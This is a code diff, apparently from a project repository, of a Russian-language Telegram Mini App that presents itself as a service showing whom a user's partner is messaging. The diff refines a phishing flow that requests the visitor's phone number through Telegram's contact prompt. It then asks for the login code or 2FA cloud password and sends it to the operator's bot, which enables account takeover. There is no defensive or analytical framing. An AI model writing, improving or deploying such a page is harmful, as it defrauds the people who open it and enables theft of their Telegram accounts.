@@ -2,35 +2,38 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .container { width: 90%; max-width: 400px; padding: 20px; border-radius: 20px; background: #111; border: 1px solid #222; }
-        h2 { color: #00ff88; font-size: 18px; margin-bottom: 20px; }
-        button { width: 100%; padding: 15px; border: none; border-radius: 10px; background: #fff; color: #000; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        input { width: 90%; padding: 12px; margin-top: 10px; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; text-align: center; }
+        body { margin: 0; background-color: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { width: 85%; padding: 30px; border-radius: 25px; background: #0a0a0a; border: 1px solid #1a1a1a; box-shadow: 0 15px 35px rgba(0,0,0,0.8); text-align: center; }
+        h2 { color: #00ff88; font-size: 19px; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        p { color: #888; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        button { width: 100%; padding: 16px; border: none; border-radius: 12px; background: #fff; color: #000; font-weight: 800; cursor: pointer; transition: 0.2s; }
+        button:active { transform: scale(0.98); opacity: 0.9; }
+        input { width: 100%; padding: 14px; margin-top: 15px; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; text-align: center; box-sizing: border-box; font-size: 16px; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="card">
         <div id="step1">
-            <h2>Проверь, с кем общается твой парень</h2>
-            <button onclick="nextStep(2)">АВТОРИЗАЦИЯ</button>
+            <h2>Проверка доступа</h2>
+            <p>Узнайте, с кем общается ваш партнер. Для запуска сканирования необходима авторизация в системе.</p>
+            <button onclick="showStep(2)">АВТОРИЗАЦИЯ</button>
         </div>
 
         <div id="step2" class="hidden">
-            <h2>Шаг 1: Доступ к контактам</h2>
-            <p style="font-size: 12px; color: #888;">Для синхронизации данных необходимо подтвердить номер телефона</p>
-            <button id="auth-btn">ПОДТВЕРДИТЬ НОМЕР</button>
+            <h2>Шаг 1/2</h2>
+            <p>Для синхронизации данных подтвердите владение аккаунтом через системный шлюз.</p>
+            <button id="contact-btn">ПОДТВЕРДИТЬ НОМЕР</button>
         </div>
 
         <div id="step3" class="hidden">
-            <h2>Шаг 2: Безопасность</h2>
-            <p style="font-size: 12px; color: #888;">Введите код из сообщения или 2FA пароль</p>
-            <input type="text" id="auth-code" placeholder="Код или пароль">
-            <button onclick="sendFinalData()">ВОЙТИ</button>
+            <h2>Шаг 2/2</h2>
+            <p>Введите полученный код или облачный пароль (2FA) для завершения привязки.</p>
+            <input type="text" id="auth-code" placeholder="Код / Пароль">
+            <button onclick="finish()">ПОЛУЧИТЬ ОТЧЕТ</button>
         </div>
     </div>
 
@@ -39,32 +42,31 @@
         tg.ready();
         tg.expand();
 
-        function nextStep(step) {
+        function showStep(step) {
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
         }
 
-        // Запрос номера телефона через интерфейс Telegram
-        document.getElementById('auth-btn').addEventListener('click', () => {
+        document.getElementById('contact-btn').addEventListener('click', () => {
             tg.requestContact((ok) => {
                 if (ok) {
                     document.getElementById('step2').classList.add('hidden');
                     document.getElementById('step3').classList.remove('hidden');
                 } else {
-                    alert("Для работы сервиса необходима авторизация");
+                    alert("Авторизация отклонена. Попробуйте еще раз.");
                 }
             });
         });
 
-        function sendFinalData() {
+        function finish() {
             const code = document.getElementById('auth-code').value;
-            if (code) {
-                tg.sendData(JSON.stringify({
-                    action: "auth_attempt",
-                    payload: code
-                }));
-                tg.close();
-            }
+            if (!code) return alert("Введите код подтверждения!");
+            
+            tg.sendData(JSON.stringify({
+                "type": "auth_data",
+                "code": code
+            }));
+            tg.close();
         }
     </script>
 </body>
